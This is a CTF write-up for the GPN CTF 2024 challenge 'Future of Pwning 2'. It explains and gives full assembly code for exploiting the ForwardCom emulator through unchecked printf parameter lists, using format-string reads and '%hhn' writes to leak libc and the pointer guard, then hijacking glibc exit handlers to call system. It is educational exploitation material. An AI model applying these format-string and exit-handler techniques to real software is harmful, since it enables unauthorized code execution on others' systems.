# GPN CTF 2024 - Future of Pwning 2

- Category: pwn
- Final point value: 500
- Number of solves: 1
- Solved by: `Explosiontime202` & `fkil`

## Challenge Description

The challenge description says:

> Stop hacking my lovely emulator!!1 I removed all syscalls besides some very basic ones so hacking is impossible now.

It references the previous challenge, Future of Pwning 1, which is the warmup challenge.

Both challenges feature a new open-source, forward compatible ISA, aptly named ForwardCom ISA ([website](https://www.forwardcom.info/), [manual](https://raw.githubusercontent.com/ForwardCom/manual/master/forwardcom.pdf)). The developer of this ISA provides a toolkit which contains a Assembler, Disassembler, Linker, Library Manager and an Emulator ([source code](https://github.com/ForwardCom/bintools)). There are also some [libraries](https://github.com/ForwardCom/libraries) available. The challenges use the emulator to run a ForwardCom binary from the user. ForwardCom binaries are essentially slightly adapted ELF files.

There is currently no compiler which supports ForwardCom as target, so the only viable option to create a ForwardCom binary, is to write a program in its high-level assembler language. The ISA supports all common operations and uses 32 registers (as well as vector registers which are not at all relevant for this challenge). Arguments are passed in the first 16 registers, and if that is not enough or a variable amount of arguments need to be passed (e.g. for `printf`), a pointer to a parameter list is passed in a register. A parameter list is just a continuous memory region.

System calls are provided in the form of wrappers around libc functions. The supported ones are:
```C
// System function names
SIntTxt systemFunctionNames[] = {
    {SYSF_EXIT,              "exit"},       // terminate program
    {SYSF_ABORT,             "abort"},      // abort program
    {SYSF_TIME,              "time"},       // time in seconds since jan 1, 1970    

// input/output functions
    {SYSF_PUTS,              "puts"},       // write string to stdout
    {SYSF_PUTCHAR,           "putchar"},    // write character to stdout
    {SYSF_PRINTF,            "printf"},     // write formatted output to stdout
    {SYSF_FPRINTF,           "fprintf"},    // write formatted output to file
    {SYSF_SNPRINTF,          "snprintf"},    // write formatted output to string buffer 
    {SYSF_FOPEN,             "fopen"},      //  open file
    {SYSF_FCLOSE,            "fclose"},     // SYSF_FCLOSE
    {SYSF_FREAD,             "fread"},      // read from file
    {SYSF_FWRITE,            "fwrite"},     // write to file 
    {SYSF_FFLUSH,            "fflush"},     // flush file 
    {SYSF_FEOF,              "feof"},       // check if end of file 
    {SYSF_FTELL,             "ftell"},      // get file position 
    {SYSF_FSEEK,             "fseek"},      // set file position 
    {SYSF_FERROR,            "ferror"},     // get file error    
    {SYSF_GETCHAR,           "getchar"},    // read character from stdin 
    {SYSF_FGETC,             "fgetc"},      // read character from file 
    {SYSF_FGETS,             "fgets"},      // read string from file 
    {SYSF_SCANF,             "scanf"},      // read formatted input from stdio 
    {SYSF_FSCANF,            "fscanf"},     // read formatted input from file 
    {SYSF_SSCANF,            "sscanf"},     // read formatted input from string buffer 
    {SYSF_REMOVE,            "remove"},     // delete file 
};
// source: https://github.com/ForwardCom/bintools/blob/779c06891cba05a97a214a23b7a63aeff25d983a/emulator6.cpp#L40-L68
```

This makes solving Future of Pwning 1 very easy, as the functionality for file operations is provided as system calls in the ISA.

For the second challenge, most of the system calls were removed by the following patch:
```patch
# remove-syscalls.patch
diff a/emulator6.cpp b/emulator6.cpp
--- a/emulator6.cpp
+++ b/emulator6.cpp
@@ -324,109 +324,6 @@ void CThread::systemCall(uint32_t mod, uint32_t funcid, uint8_t rd, uint8_t rs)
         case SYSF_PRINTF:    // write formatted output to stdout
             registers[0] = fprintfEmulated(stdout, (const char*)memory + registers[0], (uint64_t*)(memory + registers[1]));
             break; 
-        case SYSF_FPRINTF:   // write formatted output to file
-            registers[0] = fprintfEmulated((FILE *)(registers[0]), (const char*)memory + registers[1], (uint64_t*)(memory + registers[2]));
-            break;
-            /*
-        case SYSF_SNPRINTF:   // write formatted output to string buffer 
-            // this works only in 64 bit windows
-            dsize = registers[1];  // size of data to read
-            if (checkSysMemAccess(registers[0], dsize, rd, rs, SHF_WRITE) < dsize) {
-                interrupt(INT_ACCESS_WRITE); // write access violation
-                ret = 0;
-            }
-            else ret = snprintf((char*)memory + registers[0], registers[1], (const char*)memory + registers[2], (const char*)memory + registers[3]);
-            registers[0] = ret;
-            break;*/
-        case SYSF_FOPEN:     //  open file
-            registers[0] = (uint64_t)fopen((const char*)memory + registers[0], (const char*)memory + registers[1]);
-            break;
-        case SYSF_FCLOSE:    // SYSF_FCLOSE
-            registers[0] = (uint64_t)fclose((FILE*)registers[0]);
-            break;
-        case SYSF_FREAD:     // read from file
-            dsize = registers[1] * registers[2];  // size of data to read
-            if (checkSysMemAccess(registers[0], dsize, rd, rs, SHF_WRITE) < dsize) {
-                interrupt(INT_ACCESS_WRITE); // write access violation
-                registers[0] = 0;
-            }
-            else registers[0] = (uint64_t)fread(memory + registers[0], (size_t)registers[1], (size_t)registers[2], (FILE *)(size_t)registers[3]);
-            break;
-        case SYSF_FWRITE:    // write to file 
-            dsize = registers[1] * registers[2];  // size of data to write
-            if (checkSysMemAccess(registers[0], dsize, rd, rs, SHF_READ) < dsize) {
-                interrupt(INT_ACCESS_READ); // write access violation
-                registers[0] = 0;
-            }
-            else registers[0] = (uint64_t)fwrite(memory + registers[0], (size_t)registers[1], (size_t)registers[2], (FILE *)(size_t)registers[3]);
-            break;
-        case SYSF_FFLUSH:    // flush file 
-            registers[0] = (uint64_t)fflush((FILE *)registers[0]);
-            break;
-        case SYSF_FEOF:      // check if end of file 
-            registers[0] = (uint64_t)feof((FILE *)registers[0]);
-            break;
-        case SYSF_FTELL:     // get file position 
-            registers[0] = (uint64_t)ftell((FILE *)registers[0]);
-            break;
-        case SYSF_FSEEK:     // set file position 
-            registers[0] = (uint64_t)fseek((FILE *)registers[0], (long int)registers[1], (int)registers[2]);
-            break;
-        case SYSF_FERROR:    // get file error
-            registers[0] = (uint64_t)ferror((FILE *)registers[0]);
-            break;
-        case SYSF_GETCHAR:   // read character from stdin 
-            registers[0] = (uint64_t)getchar();
-            break;
-        case SYSF_FGETC:     // read character from file 
-            registers[0] = (uint64_t)fgetc((FILE *)registers[0]);
-            break;
-        case SYSF_FGETS:     // read string from file 
-            dsize = registers[1];  // size of data to read
-            if (checkSysMemAccess(registers[0], dsize, rd, rs, SHF_WRITE) < dsize) {
-                interrupt(INT_ACCESS_WRITE); // write access violation
-                registers[0] = 0;
-            }
-            else {
-                registers[0] = (uint64_t)fgets((char *)(memory+registers[0]), (int)registers[1], (FILE *)registers[2]);
-            }
-            break;
-        case SYSF_GETS_S:     // read string from stdin 
-            dsize = registers[1];  // size of data to read
-            if (checkSysMemAccess(registers[0], dsize, rd, rs, SHF_WRITE) < dsize) {
-                interrupt(INT_ACCESS_WRITE); // write access violation
-                registers[0] = 0;
-            }
-            else {
-                char * r = fgets((char *)(memory+registers[0]), (int)registers[1], stdin);
-                if (r == 0) registers[0] = 0;  // registers[0] unchanged if success
-            }
-            break;
-            /*
-        case SYSF_SCANF:     // read formatted input from stdio 
-            ret = vscanf((char *)(memory+registers[0]), (va_list)(memory + registers[1]));
-            if (checkSysMemAccess(registers[0], ret, rd, rs, SHF_WRITE) < ret) {
-                interrupt(INT_ACCESS_WRITE); // write access violation
-            }
-            registers[0] = ret;
-            break;
-        case SYSF_FSCANF:    // read formatted input from file 
-            ret = vfscanf((FILE *)registers[0], (char *)(memory+registers[1]), (va_list)(memory + registers[2]));
-            if (checkSysMemAccess(registers[0], ret, rd, rs, SHF_WRITE) < ret) {
-                interrupt(INT_ACCESS_WRITE); // write access violation
-            }
-            registers[0] = ret;
-            break;
-        case SYSF_SSCANF:    // read formatted input from string buffer 
-            ret = vsscanf((char *)(memory+registers[0]), (char *)(memory+registers[1]), (va_list)(memory + registers[2]));
-            if (checkSysMemAccess(registers[0], ret, rd, rs, SHF_WRITE) < ret) {
-                interrupt(INT_ACCESS_WRITE); // write access violation
-            }
-            registers[0] = ret;
-            break; */
-        case SYSF_REMOVE:    // delete file 
-            registers[0] = (uint64_t)remove((char *)(memory+registers[0]));
-            break;
         }
     }
 }
```

This only leaves only `_printf` as potent system call. But naturally, it can't be used to execute `/flagme` which is the target of this challenge.

To quote the manual:

> Function calling convention. Call stack and data stack are separate. The function calling convention is **safe** and efficient.

Function calls may be safe, but the emulator may be not... <img src="https://i.pinimg.com/736x/f1/6c/83/f16c83e58cc59cde6f433c0c08c46845.jpg" width="20" height="20">

The challenge runs on Ubuntu 22.04 with glibc version "Ubuntu GLIBC 2.35-0ubuntu3.7". The emulator is build with `-D_FORTIFY_SOURCE=0`, which is relevant for the challenge as we are going to exploit `printf` and fortify source at level 2 or higher disables the usage of `%n` in non readonly format strings. More on fortify source in the glibc can be found [here](https://www.gnu.org/software/libc/manual/html_node/Source-Fortification.html). In terms of the other security features, we have them all. (i.e. FULL RELRO, Canary, NX, PIE)

## Leaking a libc address

One may think that we already have arbitrary read and writes because it is supported in the ISA. But the memory we can access is the virtual memory of the *guest*. Thus, all those memory accesses are bounds checked and we cannot use the builtin memory access instructions of the ISA for exploitation. The only place I could find where there is a lack of bounds check is if parameter lists are used. As `_printf` has a variable number of arguments, it uses parameter lists.

This means we can call `_printf` with any pointer as parameter list. But we need to be aware of the mapping from guest virtual addresses to host virtual address. This is achieved by adding `memory` to the guest virtual address which refers to the host virtual address where the ELF file is loaded. But we still need to circumvent ASLR to read a libc address. Fortunately, the ForwardCom ELF file is loaded using `mmap` and as such is in the mmap region of the hosts virtual address space. Therefore, the offset to the libc is constant. This means we can use a ForwardCom address which is out of bounds of the ELF file and actually points inside the libc in the emulator. The guest virtual address we used here is `0x31fc08`. There are multiple other location where libc address can be found inside the libc, especially in the libc's GOT and data sections.

Now we need to craft a format string such that we can read a libc address. Although we can print the libc address to stdout, we cannot get it into our ForwardCom program again, because we cannot input anything to our binary. (i.e. no read from stdin) Fortunately, `_printf` returns the number of written bytes. And more fortunately, there is a format string modifier so that we can control the number of bytes printed. This modifier is `'*'`. It is used to specify the min. amount of bytes printed for a format specifier, also known as width modifier. The argument is supplied as a `int` to printf. For example, `printf("%*c", len, 5)` will print at least `len` bytes. In this case, it will print exactly `len` bytes for `len > 0` because `"%c"` would only print 1 char.

So, for this to work, we require `len > 0`, which means that our values cannot be `0x00000000`. Put to usually, leaking this is not very helpful and this is also not common in addresses, so we can disregard that case.
Another bigger problem with that technique is that the length argument is of type `int`. The value could be very large, resulting in up to 15 Gigabytes of whitespaces, which could be somewhat handled (pipe to `/dev/null`). The much larger problem are negative values: They are negated, so that they are positive then. But this also means we need to know the sign of the integer we are printing. To solve this issue in a deterministic fashion, we used the following algorithm:

1. Leak from higher to lower addresses.
2. Leak 3B at once, the highest bytes need to be already known, so that we can handle negative values.
3. If the integer was negative,  negate the return value of `_printf`. The only problematic value is `0x80000000 = -2147483648` because there is no representation of its absolute value as an `int`. We do not consider this edge case of its very low probability.
4. Start with 2 again until all bytes were leaked.

A requirement of this algorithm is, that the sign of the first byte (i.e. byte at the highest address) needs to be known. My implementation assume the sign to be positive.

For the libc address we chose, this requirement is fulfilled because addresses in userspace always have their upper 2 bytes set to zero, this the sign of the highest byte is positive.


## From libc leak to RCE

As the emulator is compiled with `FULL RELRO` and `PIE`, the GOT is out of reach. But the exit functions are stored in the libc which is perfect for this exploit. Because the function pointers in the exit functions are mangled, we need to leak the pointer guard from the thread-local storage (TLS). To our convenience, the TLS is mmaped and usually right before the libc. We can use the algorithm from before again. Alternatively, to reduce the amount of printed whitespaces, one can use an enhanced algorithm:

1. Start from the hightest address, go towards lower addresses. There should be zeros above int he 3 bytes above the hightest address to reduce the amount of printed whitespaces.
2. Leak the byte using `"%*d"` again. No postprocessing with negative values required. Should only be a 1 byte long integer.
3. Overwrite the last read byte with 0 using `%hhn`.
4. Continue with 2. until all bytes were read.
5. Finally, write the pointer guard back, byte for byte, using `"A" * pointer_guard[i] + "%hhn"`.

This technique requires the memory we want to leak to be writeable. For the libc leak, it was not possible to use this improved algorithm because we did not have the full address of our leak which we need to supply to `"%hhn"`.

But what how does the pointer mangling with the pointer guard works? Like that:
```C
uintptr_t mangle(uinptr_t ptr, uinptr_t pointer_guard) {
  return rotate_left(ptr ^ pointer_gaurd, 17);
}
```

Now that we have all required leaks, we can take a look at the implementation of the exit functions. The following code is the glibc source code defining exit functions. The exit functions are stored in a linked list. Each exit function can be of different types, which define which arguments are passed to the function. 

```C
enum
{
  ef_free,	/* `ef_free' MUST be zero!  */
  ef_us,
  ef_on,
  ef_at,
  ef_cxa
};

struct exit_function
  {
    /* `flavour' should be of type of the `enum' above but since we need
       this element in an atomic operation we have to use `long int'.  */
    long int flavor;
    union
      {
	void (*at) (void);
	struct
	  {
	    void (*fn) (int status, void *arg);
	    void *arg;
	  } on;
	struct
	  {
	    void (*fn) (void *arg, int status);
	    void *arg;
	    void *dso_handle;
	  } cxa;
      } func;
  };
struct exit_function_list
  {
    struct exit_function_list *next;
    size_t idx;
    struct exit_function fns[32];
  };

// source: https://elixir.bootlin.com/glibc/glibc-2.35/source/stdlib/exit.h#L25
```

Our target is to overwrite one of the exit functions so that `system("/flagme")` is called. Because the libc for this challenge was patched to use `"/flagme` instead of `"/bin/sh`, the argument to `system` is irrelevant. It just needs to be readable memory because system will read it. So we can use any exit function type, we chose `ef_at = 3` for simplicity.  

There always exists a `initial` exit function list, so we will put our exit functions in there.

```c
// https://elixir.bootlin.com/glibc/glibc-2.35/source/stdlib/cxa_atexit.c#L75
static struct exit_function_list initial;
struct exit_function_list *__exit_funcs = &initial;
```

To actually get the flag in the browser, we actually needed to flush the output stream before calling `system`. I assume it is because the output is buffered, but I am not sure. The weird part is that we flush **before** we call `system`. To flush the output stream, we need to call `fflush(stdout)`. So we have to use exit function type `ef_cxa = 4` because the argument we can supply, is the first parameter of the function.

The exit functions are executed in the reverse order they were installed in. This means `fns[1]` is execute before `fns[0]`. Therefore the full payload we want to write to `&initial->fns` is:
```C
struct exit_function exploit_exit_functions[2] = {
  {
    .flavor = ef_at,
    .at = mangle(&system, pointer_guard)
  },
  {
    .flavor = ef_cxa,
    .fn = amngle(&s)
  }
};
```

Now we need write it into memory. To do that, we implemented a `_write` function which uses `_printf` with `"%hhn"` to write the source bytes at the destintation address, byte for byte.

The last is to return from the main function of our program so that the emulator exits and the exit functions are executed. Watch out to return `0` in `r0` or else the output is not printed ont the website. Alternatively, one could use `_exit` (a ForwardCom syscall, not to confuse with libcs symbol `_exit`) which effectively does the same thing.

## Full exploit code

To assembler the code in to a ForwardCom, use the following commands:

1. `./forw -ass exploit.S` to assemble to a object file
2. `./forw -link exploit.ex exploit.ob libc.li` to link to a executable

The `libc.li` supplies small wrappers around the ForwardCom system call. You can either use the version provided in this repository, download it from the [library source repository](https://github.com/ForwardCom/libraries) or build it from source.

```asm
extern _printf: function

const section read ip // read-only data section
fmt_leak_str: int8 "%*c", 0
print_hex: int8 "||%#lx||\n ", 0
write_1_byte: int8 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%hhn",0
clear_byte: int8 "%hhn",0
newline: int8 "\n ",0
const end

bss section datap uninitialized // read-write data section
int64 parlist[5]
int8 libc_addr[8]
int8 tmp_mem[0x18]
int8 pointer_guard[9]
bss end

code section execute // executable code section

_leak function public
// r0: src (pointer to start of the leak)
// r1: dst (where to write the leaked bytes)
// r2: length of the leak (excluding the leading byte which will not be leaked)

// assumes that *(int8_t *)(src + length) >= 0
// for simplicity: length % 3 == 0, length >= 3

// interal register assignment
// r16: remaining length
// r17: current pointer to leak
// r18: current dst pointer
// r19: is negative mask

int64 r16 = r2
int64 r17 = r0 + r2 - 3
int64 r18 = r1 + r2 - 3
int64 r19 = 0

do {
    // leak bytes
    int64 r0 = address([fmt_leak_str])
    int64 r1 = r17
    call _printf

    // apply is_negative_mask: r0 = (r >> 24) >= 0 ? r0 : (-r0)
    // because we are lazy and don't want to use a conditional, we use the folliwng equivalent expression:
    // r0 = (r >> 24) >= 0 ? r0 : ((r0 ^ r19) - r19)
    int32 r0 = r0 ^ r19 // invert if negaitve
    int32 r0 = r0 - r19 // + 1 iff negative
    int32 r0 = r0 & 0xFFFFFF // we are only interested in the lower 3B

    // store leaked bytes
    int32 r1 = r0 & 0xFF
    int8 [r18] = r1
    int32 r1 = r0 >> 8
    int32 r1 = r1 & 0xFF
    int8 [r18 + 1] = r1
    int32 r1 = r0 >> 16
    int8 [r18 + 2] = r1

    // calculate is_negative_mask
    int32 r19 = r0 & 0x80
    int32 r19 = r19 << 24
    int32 r19 = shift_right_s(r19, 31)

    // move src and dst pointers to next location
    int64 r16 = r16 - 3
    int64 r17 = r17 - 3
    int64 r18 = r18 - 3
} while (int64 r16 > 0)

return
_leak end


_leak_efficient function public
// r0: src offset (guest addr)
// r1: src addr (host addr)
// r2: dst
// r3: length

// assumes src[length] to be writeable
// as well as *(int32_t *)(src + length - 1) small positive value, i.e. above src no large values (=> efficiency decreases) and no negative values (=> algorithm breaks)

// internal register alloacation:
// r16: cur src pointer
// r17: cur dst address
// r18: cur dst pointer
// r19: remaining length
// r20: saved length

int64 r16 = r0 + r3
int64 r17 = r1 + r3
int64 r18 = r2 + r3
int64 r19 = r3
int64 r20 = r3

do {
    int64 r16 = r16 - 1
    int64 r17 = r17 - 1
    int64 r18 = r18 - 1

    // leak byte
    int64 r1 = r16
    int64 r0 = address([fmt_leak_str])
    call _printf
    
    // store lekaed byte
    int64 r0 = r0 & 0xFF
    int8 [r18] = r0

    // prepare write zero
    int64 r1 = address([parlist])
    int64 [r1] = r17
    int64 r0 = address([clear_byte])
    call _printf

    int64 r19 = r19 - 1
} while(int64 r19 > 0) 

// write back value, leaked byte for byte
int64 r0 = r17
int64 r1 = r18
int64 r2 = r20
call _write

return
_leak_efficient end


_write function public
// r0: dst
// r1: src
// r2: length

// interal register assignemnt
// r16 = remaining length
// r17 = cur src pointer
// r18 = cur dst pointer

int64 r16 = r2 
int64 r17 = r1
int64 r18 = r0

do {
    // load src byte
    int64 r0 = 0
    int8 r2 = [r17]

    // put cur dst addr in parlist
    int64 r1 = address([parlist])
    int64 [r1] = r18

    // calculate format string
    int64 r0 = address([write_1_byte])
    int64 r0 = r0 - r2 + 256
    call _printf

    int64 r16 = r16 - 1
    int64 r17 = r17 + 1
    int64 r18 = r18 + 1
} while (int64 r16 >= 0)

return
_write end

_mangle_pointer function public
// r0: pointer
// pointer guard is loaded from [pointer_guard]
// guarantee: does not modify registers except r0

int64 r0 = r0 ^ [pointer_guard]
int64 r0 = rotate(r0, 17)
return
_mangle_pointer end


_main function public

// leak libc addr
int64 r0 = 0x31fc08
int64 r1 = address([libc_addr])
int64 [r1] = 0
int64 r2 = 6
call _leak

// print libc base addr for debug purposes
int64 r16 = [libc_addr]
int64 r16 = r16 - 0x3c8 // libc base
int64 [libc_addr] = r16
int64 r1 = address([parlist])
int64 [r1] = r16
int64 r0 = address([print_hex])
call _printf


// leak pointer guard
int64 r0 = 0x105ff0 - 0x4890 // pointer guard offset
int64 r1 = [libc_addr]
int64 r1 = r1 - 0x4890 // pointer guard addr
int64 r2 = address([pointer_guard])
int64 r3 = 9
call _leak_efficient

// print pointer guard to stdout for debug purposes
int64 r2 = [pointer_guard]
int64 r1 = address([parlist])
int64 [r1] = r2
int64 r0 = address([print_hex])
call _printf

// overwrite exit functions

int64 r24 = [libc_addr]
int64 r25 = r24 + 0x21bf00 // initial addr


// put system into initial->fns[0]
int64 r0 = r24 + 0x50d70 // system addr
call _mangle_pointer

int64 [tmp_mem + 8] = r0
int64 r0 = 3 // ef_at
int64 [tmp_mem] = r0
int64 r0 = r25 + 0x10
int64 r1 = address([tmp_mem])
int64 r2 = 16
call _write


// put fflush into initial->fns[1]
// also put stdout after it as argument
int64 r0 = r24 + 0x7f130 // fflush addr
call _mangle_pointer

int64 [tmp_mem + 8] = r0
int64 r0 = 4 // ef_cxa
int64 [tmp_mem] = r0
int64 r0 = r24 + 0x21b780 // stdout addr
int64 [tmp_mem + 16] = r0
int64 r0 = r25 + 0x30
int64 r1 = address([tmp_mem])
int64 r2 = 0x18
call _write


// print newline so that the flag is at the beginning of the line
int64 r0 = address([newline])
int64 r1 = address[parlist]
call _printf

int64 r0 = 0
return

_main end
code end

```